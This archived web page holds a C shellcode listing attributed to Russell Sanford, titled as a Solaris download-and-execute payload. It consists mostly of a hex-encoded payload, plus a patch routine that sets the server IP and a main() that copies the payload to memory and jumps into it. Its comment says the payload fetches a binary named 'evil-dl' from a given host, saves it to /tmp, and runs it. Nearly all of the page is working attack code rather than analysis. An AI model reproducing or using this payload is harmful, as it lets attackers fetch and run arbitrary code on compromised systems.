<html><head><title>Solaris/mips - download and execute - 278 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

 black-dl-exec-SOLARIS.c (MIPS)  [278:bytes]
 Dowloads a binary from host given named 'evil-dl' to '/tmp/ff' then executes.
 11.21.6  Russell Sanford  (xort@blacksecurity.org)

 gcc -lnsl black-dl-exec-SOLARIS.c -o bdes

*/

#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

// opcode encodings for performing sethi/or against/into register %o1 w/ nulled data

#define SETHI_O1 0x13000000
#define OR_O1	 0x92126000

char dl_exec_sh[] =
&quot;\xa6\x1a\xc0\x0b\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x10\x20\x02\x92\x10\x20\x02&quot;
&quot;\x94\x1a\x80\x0a\x96\x1a\xc0\x0b\x98\x10\x20\x01\x82\x10\x20\xe6\x91\xd0\x20\x08\xc0\x2b\xe0\xa6&quot;
&quot;\xd0\x23\xbf\xfc\x92\x20\x3f\xfe\x93\x2a\x60\x10\x92\x22\x7f\xb0\xd2\x23\xbf\xec\x13\x37\xab\x6f&quot;
&quot;\x92\x12\x62\xef\xd2\x23\xbf\xf0\xc0\x23\xbf\xf4\x92\x03\xbf\xec\x94\x10\x20\x10\x82\x10\x20\xeb&quot;
&quot;\x91\xd0\x20\x08\xc0\x2b\xe1\x0e\x92\x03\xe0\xfc\x94\x20\x3f\xf2\xd0\x03\xbf\xfc\x82\x10\x20\x04&quot;
&quot;\x91\xd0\x20\x08\xc0\x2b\xe0\xfb\x90\x03\xe0\xf4\x94\x20\x3c\x13\x92\x20\x3e\xfe\x82\x10\x20\x05&quot;
&quot;\x91\xd0\x20\x08\xd0\x23\xbf\xf8\xd0\x03\xbf\xfc\x92\x03\xbf\xc4\x94\x10\x20\x14\x82\x10\x20\x03&quot;
&quot;\x91\xd0\x20\x08\xa4\xa4\xc0\x08\x02\x80\xFF\x06\x94\x0a\x3f\xff\xd0\x03\xbf\xf8\x82\x10\x20\x04&quot;
&quot;\x91\xd0\x20\x08\x10\xbf\xff\xf5\x94\x1a\x80\x0a\xd4\x23\xe0\xfc\xd4\x23\xe0\xf0\x90\x03\xe0\xf4&quot;
&quot;\xd0\x23\xe0\xec\x92\x03\xe0\xec\x82\x10\x20\x0b\x91\xd0\x20\x08\x6f\x6d\x66\x67\x20\x73\x6f\x6c&quot;
&quot;\x61\x72\x69\x73\x20\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x7a\x21\x2f\x74\x6d\x70\x2f\x71\x71\x41&quot;
&quot;\x47\x45\x54\x20\x2f\x65\x76\x69\x6c\x2d\x64\x6c\x0a\x0a&quot;; 


void patchcode(long webserver) {

	// fix sethi instruction to set up ip.
	*(long *)&amp;dl_exec_sh[68] = SETHI_O1 + ((webserver)&gt;&gt;10 &amp; 0x3fffff);

	// FIX or instruction to set up ip.
	*(long *)&amp;dl_exec_sh[72] = OR_O1 + (webserver &amp; 0x2ff);
}

void (*fakefunc)();

void main() {

	patchcode(inet_addr(&quot;10.1.1.2&quot;));
	char *buffer = (char *) malloc(1024);
	memcpy(buffer, dl_exec_sh, 280);
	fakefunc = buffer;
	fakefunc();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
